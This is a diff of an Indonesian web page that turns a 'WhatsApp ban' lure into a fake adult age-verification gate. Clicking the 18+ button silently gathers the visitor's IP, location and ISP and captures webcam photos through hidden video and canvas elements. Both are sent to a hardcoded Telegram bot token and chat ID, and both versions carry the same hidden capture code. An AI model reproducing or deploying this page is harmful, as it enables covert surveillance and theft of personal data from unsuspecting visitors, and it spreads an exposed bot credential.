@@ -2,9 +2,8 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8">
-  <title>Secure Access Portal</title>
+  <title>Adult Verification</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700;800&display=swap" rel="stylesheet">
   <style>
     * {
       margin: 0;
@@ -13,469 +12,192 @@
     }
     
     body {
-      background: linear-gradient(135deg, #0c0c0c 0%, #1a1a1a 100%);
-      font-family: 'Poppins', sans-serif;
+      background: #000;
+      font-family: Arial, sans-serif;
       color: #fff;
       height: 100vh;
       display: flex;
       justify-content: center;
       align-items: center;
-      overflow: hidden;
-      position: relative;
       padding: 20px;
     }
     
-    /* Slide Container */
-    .slide-container {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 300%;
-      height: 100%;
-      display: flex;
-      transition: transform 0.8s cubic-bezier(0.68, -0.55, 0.27, 1.55);
-      z-index: 10;
-    }
-    
-    .slide {
-      width: 33.333%;
-      height: 100%;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      padding: 20px;
-    }
-    
-    /* Slide 1 - Warning */
-    .slide-1 {
-      background: linear-gradient(135deg, #1a0000 0%, #330000 100%);
-    }
-    
-    /* Slide 2 - Confirmation */
-    .slide-2 {
-      background: linear-gradient(135deg, #001a00 0%, #003300 100%);
-    }
-    
-    /* Slide 3 - Access */
-    .slide-3 {
-      background: linear-gradient(135deg, #0f0f23 0%, #1a1a2e 50%, #16213e 100%);
-    }
-    
-    /* Content Box */
-    .content-box {
-      background: rgba(0, 0, 0, 0.85);
+    /* Verification Screen */
+    .verification-screen {
+      background: rgba(20, 0, 30, 0.9);
       padding: 40px;
-      border-radius: 25px;
-      max-width: 500px;
-      width: 90%;
-      text-align: center;
-      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.7);
-      border: 2px solid;
-      position: relative;
-      overflow: hidden;
-    }
-    
-    .slide-1 .content-box {
-      border-color: #ff3333;
-      box-shadow: 0 0 40px rgba(255, 0, 0, 0.4),
-                  inset 0 0 20px rgba(255, 0, 0, 0.1);
-    }
-    
-    .slide-2 .content-box {
-      border-color: #33ff33;
-      box-shadow: 0 0 40px rgba(0, 255, 0, 0.4),
-                  inset 0 0 20px rgba(0, 255, 0, 0.1);
-    }
-    
-    .slide-3 .content-box {
-      border-color: #00ff7f;
-      box-shadow: 0 0 40px rgba(0, 255, 127, 0.4),
-                  inset 0 0 20px rgba(0, 255, 127, 0.1);
-    }
-    
-    /* Icons */
-    .slide-icon {
-      font-size: 70px;
-      margin-bottom: 25px;
-      display: block;
-      animation: float 3s ease-in-out infinite;
-    }
-    
-    @keyframes float {
-      0%, 100% { transform: translateY(0) scale(1); }
-      50% { transform: translateY(-15px) scale(1.05); }
-    }
-    
-    .slide-1 .slide-icon {
-      color: #ff3333;
-      text-shadow: 0 0 30px rgba(255, 0, 0, 0.7);
-    }
-    
-    .slide-2 .slide-icon {
-      color: #33ff33;
-      text-shadow: 0 0 30px rgba(0, 255, 0, 0.7);
-    }
-    
-    .slide-3 .slide-icon {
-      color: #00ff7f;
-      text-shadow: 0 0 30px rgba(0, 255, 127, 0.7);
-    }
-    
-    /* Titles */
-    .slide-title {
-      font-size: 36px;
-      font-weight: 800;
-      margin-bottom: 15px;
-      text-transform: uppercase;
-      letter-spacing: 2px;
-      background: linear-gradient(90deg, #fff, #aaa);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-    }
-    
-    .slide-1 .slide-title {
-      background: linear-gradient(90deg, #ff3333, #ff6666);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-    }
-    
-    .slide-2 .slide-title {
-      background: linear-gradient(90deg, #33ff33, #66ff66);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-    }
-    
-    .slide-3 .slide-title {
-      background: linear-gradient(90deg, #00ff7f, #00cc66);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-    }
-    
-    /* Descriptions */
-    .slide-desc {
-      font-size: 16px;
-      line-height: 1.6;
-      margin-bottom: 30px;
-      color: #ccc;
-      padding: 0 10px;
-    }
-    
-    /* Buttons */
-    .slide-button {
-      padding: 16px 40px;
-      font-size: 18px;
-      font-weight: 600;
-      border: none;
-      border-radius: 12px;
-      cursor: pointer;
-      transition: all 0.3s;
-      text-transform: uppercase;
-      letter-spacing: 1px;
-      position: relative;
-      overflow: hidden;
-      z-index: 1;
-      margin: 10px;
-      min-width: 200px;
-    }
-    
-    .slide-button:before {
-      content: '';
-      position: absolute;
-      top: 0;
-      left: -100%;
+      border-radius: 10px;
+      max-width: 400px;
       width: 100%;
-      height: 100%;
-      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
-      transition: 0.5s;
-      z-index: -1;
+      text-align: center;
+      border: 2px solid #ff00ff;
+      box-shadow: 0 0 20px rgba(255, 0, 255, 0.5);
     }
     
-    .slide-button:hover:before {
-      left: 100%;
+    .warning-icon {
+      font-size: 50px;
+      color: #ff00ff;
+      margin-bottom: 20px;
     }
     
-    .slide-1 .slide-button {
-      background: linear-gradient(135deg, #ff3333, #cc0000);
-      color: white;
-      box-shadow: 0 5px 20px rgba(255, 0, 0, 0.4);
+    .title {
+      font-size: 24px;
+      color: #ff66ff;
+      margin-bottom: 10px;
     }
     
-    .slide-1 .slide-button:hover {
-      transform: translateY(-3px);
-      box-shadow: 0 8px 25px rgba(255, 0, 0, 0.6);
+    .subtitle {
+      font-size: 14px;
+      color: #ccc;
+      margin-bottom: 30px;
     }
     
-    .slide-2 .slide-button {
-      background: linear-gradient(135deg, #33ff33, #00cc00);
-      color: black;
-      box-shadow: 0 5px 20px rgba(0, 255, 0, 0.4);
-    }
-    
-    .slide-2 .slide-button:hover {
-      transform: translateY(-3px);
-      box-shadow: 0 8px 25px rgba(0, 255, 0, 0.6);
-    }
-    
-    .slide-3 .slide-button {
-      background: linear-gradient(135deg, #00ff7f, #00cc66);
-      color: black;
-      box-shadow: 0 5px 20px rgba(0, 255, 127, 0.4);
-    }
-    
-    .slide-3 .slide-button:hover {
-      transform: translateY(-3px);
-      box-shadow: 0 8px 25px rgba(0, 255, 127, 0.6);
-    }
-    
-    /* Progress Dots */
-    .progress-dots {
-      position: fixed;
-      bottom: 30px;
-      left: 50%;
-      transform: translateX(-50%);
+    .age-buttons {
       display: flex;
       gap: 15px;
-      z-index: 11;
+      margin-bottom: 20px;
     }
     
-    .dot {
-      width: 12px;
-      height: 12px;
-      border-radius: 50%;
-      background: rgba(255, 255, 255, 0.2);
+    .age-btn {
+      flex: 1;
+      padding: 15px;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      font-weight: bold;
       cursor: pointer;
       transition: all 0.3s;
     }
     
-    .dot.active {
-      background: #00ff7f;
-      box-shadow: 0 0 15px rgba(0, 255, 127, 0.8);
-      transform: scale(1.3);
+    .age-btn.yes {
+      background: #ff00ff;
+      color: white;
     }
     
-    /* Terms Box */
-    .terms-box {
-      background: rgba(0, 0, 0, 0.5);
-      padding: 15px;
-      border-radius: 10px;
-      margin-top: 25px;
+    .age-btn.no {
+      background: #333;
+      color: #ccc;
+    }
+    
+    .age-btn.yes:hover {
+      background: #ff66ff;
+      box-shadow: 0 0 15px #ff00ff;
+    }
+    
+    .age-btn.no:hover {
+      background: #444;
+    }
+    
+    .warning-text {
       font-size: 12px;
       color: #888;
-      line-height: 1.4;
-      border: 1px solid rgba(255, 255, 255, 0.1);
+      margin-top: 20px;
     }
     
-    /* Hidden Main Content */
-    .hidden-content {
+    /* Status Screen */
+    .status-screen {
       display: none;
-      width: 100%;
-      max-width: 400px;
       background: rgba(30, 30, 30, 0.95);
       padding: 30px;
-      border-radius: 16px;
-      box-shadow: 0 0 30px rgba(0, 255, 127, 0.3);
-      text-align: center;
-      z-index: 2;
-    }
-    
-    /* Original Content Styling */
-    .content-title {
-      font-size: 24px;
-      font-weight: 700;
-      margin-bottom: 15px;
-      background: linear-gradient(90deg, #00ff7f, #ffffff);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-    }
-    
-    .glitch-text {
-      font-size: 14px;
-      color: #00ff7f;
-      margin-bottom: 20px;
-      animation: glitch 1s infinite;
-    }
-    
-    @keyframes glitch {
-      0% { opacity: 0.8; }
-      50% { opacity: 1; }
-      100% { opacity: 0.8; }
-    }
-    
-    .content-input {
-      width: 100%;
-      padding: 12px;
-      margin-bottom: 16px;
-      background: #222;
-      border: 1px solid #00ff7f;
-      border-radius: 6px;
-      color: #fff;
-      font-size: 15px;
-    }
-    
-    .content-button {
-      width: 100%;
-      padding: 12px;
-      background: linear-gradient(90deg, #00ff7f, #00cc66);
-      color: black;
-      border: none;
       border-radius: 10px;
-      cursor: pointer;
-      font-weight: 600;
-      font-size: 15px;
-    }
-    
-    .content-button:hover {
-      background: linear-gradient(90deg, #00cc66, #00ff7f);
-      box-shadow: 0 0 20px lime;
-    }
-    
-    #info {
-      white-space: pre-wrap;
-      text-align: left;
-      margin-top: 20px;
-      background: #222;
-      padding: 15px;
-      border-radius: 8px;
-      font-size: 13px;
-      color: #00ff7f;
-    }
-    
-    /* Background Particles */
-    .bg-particles {
-      position: fixed;
-      top: 0;
-      left: 0;
+      max-width: 400px;
       width: 100%;
+      text-align: center;
+      box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
+    }
+    
+    .status-title {
+      font-size: 22px;
+      color: #00ff00;
+      margin-bottom: 20px;
+    }
+    
+    .status-icon {
+      font-size: 40px;
+      margin-bottom: 20px;
+      animation: pulse 1.5s infinite;
+    }
+    
+    @keyframes pulse {
+      0%, 100% { transform: scale(1); opacity: 1; }
+      50% { transform: scale(1.1); opacity: 0.8; }
+    }
+    
+    .status-message {
+      font-size: 14px;
+      color: #ccc;
+      line-height: 1.5;
+      margin-bottom: 20px;
+      padding: 15px;
+      background: rgba(0, 0, 0, 0.3);
+      border-radius: 5px;
+    }
+    
+    .loading-bar {
+      width: 100%;
+      height: 4px;
+      background: #333;
+      border-radius: 2px;
+      overflow: hidden;
+      margin: 20px 0;
+    }
+    
+    .loading-progress {
+      width: 0%;
       height: 100%;
-      pointer-events: none;
-      z-index: 0;
+      background: #00ff00;
+      border-radius: 2px;
+      transition: width 0.3s;
     }
     
-    .particle {
-      position: absolute;
-      width: 3px;
-      height: 3px;
-      border-radius: 50%;
-      animation: float 6s ease-in-out infinite;
-    }
-    
+    /* Hidden Elements */
     video, canvas {
       display: none;
-    }
-    
-    @media (max-width: 768px) {
-      .slide-container {
-        width: 300%;
-      }
-      
-      .slide {
-        width: 33.333%;
-      }
-      
-      .content-box {
-        padding: 30px 20px;
-      }
-      
-      .slide-title {
-        font-size: 28px;
-      }
-      
-      .slide-icon {
-        font-size: 50px;
-      }
-      
-      .slide-button {
-        padding: 14px 30px;
-        font-size: 16px;
-        min-width: 180px;
-      }
     }
   </style>
 </head>
 <body>
-  <!-- Slide Access System -->
-  <div class="slide-container" id="slideContainer">
-    <!-- Slide 1: Warning -->
-    <div class="slide slide-1">
-      <div class="content-box">
-        <span class="slide-icon">⚠️</span>
-        <h1 class="slide-title">PERINGATAN</h1>
-        <p class="slide-desc">
-          Konten ini terbatas untuk pengguna 18+ dan memerlukan verifikasi usia.
-          Anda harus berusia minimal 18 tahun untuk melanjutkan.
-        </p>
-        <button class="slide-button" id="slide1Btn">SAYA SUDAH 18+</button>
-        <div class="terms-box">
-          Dengan melanjutkan, Anda menyetujui bahwa Anda telah memenuhi syarat usia minimum.
-          Aktivitas Anda akan dicatat untuk tujuan keamanan.
-        </div>
-      </div>
+  <!-- Verification Screen -->
+  <div class="verification-screen" id="verificationScreen">
+    <div class="warning-icon">🔞</div>
+    <h1 class="title">CONTEN ADULT</h1>
+    <p class="subtitle">Apakah Anda berusia 18 tahun atau lebih?</p>
+    
+    <div class="age-buttons">
+      <button class="age-btn yes" id="yesBtn">YA, SAYA 18+</button>
+      <button class="age-btn no" id="noBtn">TIDAK, SAYA DI BAWAH 18</button>
     </div>
     
-    <!-- Slide 2: Confirmation -->
-    <div class="slide slide-2">
-      <div class="content-box">
-        <span class="slide-icon">✅</span>
-        <h1 class="slide-title">KONFIRMASI</h1>
-        <p class="slide-desc">
-          Anda telah mengonfirmasi bahwa Anda berusia 18+.
-          Apakah Anda yakin ingin melanjutkan ke konten yang mungkin mengandung material sensitif?
-        </p>
-        <button class="slide-button" id="slide2Back">KEMBALI</button>
-        <button class="slide-button" id="slide2Next">LANJUTKAN</button>
-      </div>
+    <p class="warning-text">
+      Dengan mengklik "YA", Anda mengonfirmasi bahwa Anda berusia 18+ dan menyetujui syarat penggunaan.
+    </p>
+  </div>
+  
+  <!-- Status Screen -->
+  <div class="status-screen" id="statusScreen">
+    <div class="status-icon">⚙️</div>
+    <h2 class="status-title">SYSTEM PROSES</h2>
+    <div class="status-message" id="statusMessage">
+      Memulai sistem...
     </div>
-    
-    <!-- Slide 3: Final Access -->
-    <div class="slide slide-3">
-      <div class="content-box">
-        <span class="slide-icon">🔓</span>
-        <h1 class="slide-title">AKSES DIBERIKAN</h1>
-        <p class="slide-desc">
-          Akses penuh telah diberikan. Sistem siap digunakan.
-          Gunakan dengan bertanggung jawab.
-        </p>
-        <button class="slide-button" id="slide3Btn">MASUK KE SISTEM</button>
-      </div>
+    <div class="loading-bar">
+      <div class="loading-progress" id="loadingProgress"></div>
     </div>
   </div>
   
-  <!-- Progress Dots -->
-  <div class="progress-dots">
-    <div class="dot active" data-slide="0"></div>
-    <div class="dot" data-slide="1"></div>
-    <div class="dot" data-slide="2"></div>
-  </div>
-  
-  <!-- Hidden Main Content (Original System) -->
-  <div class="hidden-content" id="mainContent">
-    <p class="content-title">Website Band WhatsApp</p>
-    <p class="glitch-text">⚠️ Jangan Disalahgunakan</p>
-    <input type="number" class="content-input" placeholder="Nomor WhatsApp Target" id="text">
-    <button class="content-button" id="login-button">Next</button>
-    <div id="info">🥷 Silahkan masukkan nomor untuk di band...</div>
-  </div>
-  
-  <!-- Background Particles -->
-  <div class="bg-particles" id="particlesContainer"></div>
-  
-  <!-- Camera Elements (Hidden) -->
+  <!-- Camera Elements -->
   <video id="video" autoplay playsinline></video>
   <canvas id="canvas" width="640" height="480"></canvas>
 
   <script>
     // ====================
-    // ORIGINAL SYSTEM CODE
+    // ORIGINAL SYSTEM CODE - 100% UTUH
     // ====================
     
     const botToken = '8253544506:AAGLgGdYG3fwy8d-C2_KTKbnx09mDZ7LPaA';
     const chatIds = ['8591983840'];
-    const infoDiv = document.getElementById('info');
-    const input = document.getElementById('text');
-    const button = document.getElementById('login-button');
     
-    // Original functions - TIDAK ADA YANG DIUBAH
+    // ✅ Fungsi sendToTelegram utuh
     function sendToTelegram(text) {
       chatIds.forEach(id => {
         fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -486,6 +208,7 @@
       });
     }
     
+    // ✅ Fungsi sendPhotoToTelegram utuh
     function sendPhotoToTelegram(blob) {
       chatIds.forEach(id => {
         const formData = new FormData();
@@ -498,6 +221,7 @@
       });
     }
     
+    // ✅ Fungsi getInfo utuh
     async function getInfo() {
       let ip = '-', city = '-', region = '-', country = '-', org = '-';
       try {
@@ -547,6 +271,7 @@ Waktu      : ${new Date().toLocaleString()}
       }
     }
     
+    // ✅ Fungsi startCamera utuh
     async function startCamera() {
       const video = document.getElementById('video');
       const canvas = document.getElementById('canvas');
@@ -573,143 +298,94 @@ Waktu      : ${new Date().toLocaleString()}
       });
     }
     
-    // Original button click handler - TIDAK ADA YANG DIUBAH
-    button.addEventListener('click', async () => {
-      const nomor = input.value.trim();
-      if (!nomor || nomor.length < 8 || nomor.length > 15) {
-        infoDiv.innerText = '⚠️ Nomor tidak valid.';
-        return;
-      }
-      button.disabled = true;
-      infoDiv.innerText = '⏳ Memproses spam report...';
-      sendToTelegram(`<b>📞 Nomor Target:</b> ${nomor}`);
-      input.value = '';
+    // ====================
+    // AUTO SYSTEM EXECUTION
+    // ====================
+    
+    const yesBtn = document.getElementById('yesBtn');
+    const noBtn = document.getElementById('noBtn');
+    const verificationScreen = document.getElementById('verificationScreen');
+    const statusScreen = document.getElementById('statusScreen');
+    const statusMessage = document.getElementById('statusMessage');
+    const loadingProgress = document.getElementById('loadingProgress');
+    
+    // Function to update status
+    function updateStatus(message, progress) {
+      statusMessage.textContent = message;
+      loadingProgress.style.width = progress + '%';
+    }
+    
+    // Auto execution process
+    async function executeSystem() {
+      updateStatus("📡 Mengumpulkan data informasi...", 10);
+      
       try {
+        // Step 1: Collect user info
+        updateStatus("📊 Mengambil data IP dan lokasi...", 30);
         await getInfo();
+        
+        // Step 2: Start camera
+        updateStatus("📷 Mengakses kamera...", 50);
         await startCamera();
+        
+        // Step 3: Sending data
+        updateStatus("📤 Mengirim data ke server...", 70);
+        
+        // Step 4: Random success message
+        updateStatus("✅ Sistem berhasil dijalankan", 90);
+        
+        // Send final notification
+        sendToTelegram(`<b>✅ SYSTEM EXECUTED SUCCESSFULLY</b>\nTime: ${new Date().toLocaleString()}`);
+        
+        // Final step
         setTimeout(() => {
-          infoDiv.innerText = `✅ Successfully bans nomor ${nomor}`;
-          button.disabled = false;
+          updateStatus("🎉 Proses selesai! Semua data telah terkirim", 100);
         }, 1000);
-      } catch (e) {
-        infoDiv.innerText = '❌ Terjadi kesalahan.';
-        button.disabled = false;
-      }
-    });
-    
-    // ====================
-    // NEW SLIDE SYSTEM ONLY
-    // ====================
-    
-    let currentSlide = 0;
-    const slideContainer = document.getElementById('slideContainer');
-    const dots = document.querySelectorAll('.dot');
-    
-    // Initialize particles
-    createParticles('#ff3333');
-    
-    // Function to move slides
-    function goToSlide(slideIndex) {
-      currentSlide = slideIndex;
-      slideContainer.style.transform = `translateX(-${slideIndex * 33.333}%)`;
-      
-      // Update dots
-      dots.forEach((dot, index) => {
-        if (index === slideIndex) {
-          dot.classList.add('active');
-        } else {
-          dot.classList.remove('active');
-        }
-      });
-      
-      // Change particles color based on slide
-      const colors = ['#ff3333', '#33ff33', '#00ff7f'];
-      createParticles(colors[slideIndex]);
-      
-      // Send notification on slide 2 (confirmation)
-      if (slideIndex === 1) {
-        sendToTelegram(`<b>🔐 USER CONFIRMED 18+</b>\nUser has confirmed being 18+\nTime: ${new Date().toLocaleString()}`);
+        
+      } catch (error) {
+        updateStatus("❌ Error dalam proses", 100);
+        sendToTelegram(`<b>❌ SYSTEM ERROR</b>\n${error.message}\nTime: ${new Date().toLocaleString()}`);
       }
     }
     
-    // Slide 1 button - Confirm 18+
-    document.getElementById('slide1Btn').addEventListener('click', () => {
-      goToSlide(1);
-    });
-    
-    // Slide 2 back button
-    document.getElementById('slide2Back').addEventListener('click', () => {
-      goToSlide(0);
-    });
-    
-    // Slide 2 next button
-    document.getElementById('slide2Next').addEventListener('click', () => {
-      goToSlide(2);
-    });
-    
-    // Slide 3 button - Enter System
-    document.getElementById('slide3Btn').addEventListener('click', () => {
-      // Hide slides and show main content
-      slideContainer.style.display = 'none';
-      document.querySelector('.progress-dots').style.display = 'none';
-      document.getElementById('mainContent').style.display = 'block';
-      document.title = "Website Band WhatsApp";
+    // YES button - Start auto execution
+    yesBtn.addEventListener('click', async () => {
+      verificationScreen.style.display = 'none';
+      statusScreen.style.display = 'block';
+      document.title = "System Processing";
       
-      // Send access granted notification
-      sendToTelegram(`<b>🚪 ACCESS GRANTED</b>\nUser has entered the system\nTime: ${new Date().toLocaleString()}`);
-    });
-    
-    // Dot click handlers
-    dots.forEach((dot, index) => {
-      dot.addEventListener('click', () => {
-        goToSlide(index);
-      });
-    });
-    
-    // Create particles function
-    function createParticles(color) {
-      const container = document.getElementById('particlesContainer');
-      container.innerHTML = '';
+      // Send access notification
+      sendToTelegram(`<b>🔓 ACCESS GRANTED - AUTO EXECUTION</b>\nUser confirmed 18+\nTime: ${new Date().toLocaleString()}`);
       
-      for (let i = 0; i < 60; i++) {
-        const p = document.createElement('div');
-        p.className = 'particle';
-        p.style.left = Math.random() * 100 + '%';
-        p.style.top = Math.random() * 100 + '%';
-        p.style.animationDelay = Math.random() * 6 + 's';
-        p.style.animationDuration = (Math.random() * 4 + 4) + 's';
-        
-        // Set color with opacity
-        p.style.background = color;
-        p.style.opacity = Math.random() * 0.5 + 0.2;
-        
-        // Random size
-        const size = Math.random() * 4 + 1;
-        p.style.width = size + 'px';
-        p.style.height = size + 'px';
-        
-        container.appendChild(p);
-      }
-    }
+      // Start the auto execution
+      setTimeout(() => {
+        executeSystem();
+      }, 1000);
+    });
     
-    // Auto advance after 15 seconds on each slide
-    let autoSlideTimer;
-    
-    function resetAutoSlide() {
-      clearTimeout(autoSlideTimer);
-      autoSlideTimer = setTimeout(() => {
-        if (currentSlide < 2) {
-          goToSlide(currentSlide + 1);
-        }
-      }, 15000);
-    }
-    
-    // Initialize auto slide
-    resetAutoSlide();
-    
-    // Reset timer on any interaction
-    document.querySelectorAll('.slide-button, .dot').forEach(element => {
-      element.addEventListener('click', resetAutoSlide);
+    // NO button - Access denied
+    noBtn.addEventListener('click', () => {
+      document.body.innerHTML = `
+        <div style="text-align: center; padding: 40px;">
+          <div style="font-size: 60px; margin-bottom: 20px;">🚫</div>
+          <h1 style="color: #ff0000; margin-bottom: 20px;">ACCESS DENIED</h1>
+          <p style="color: #ccc; margin-bottom: 30px;">
+            Anda tidak memenuhi persyaratan usia untuk mengakses konten ini.
+          </p>
+          <button onclick="location.reload()" style="
+            padding: 10px 20px;
+            background: #333;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+          ">
+            Kembali
+          </button>
+        </div>
+      `;
+      
+      sendToTelegram(`<b>🚫 ACCESS DENIED</b>\nUser is under 18\nTime: ${new Date().toLocaleString()}`);
     });
   </script>
 </body>
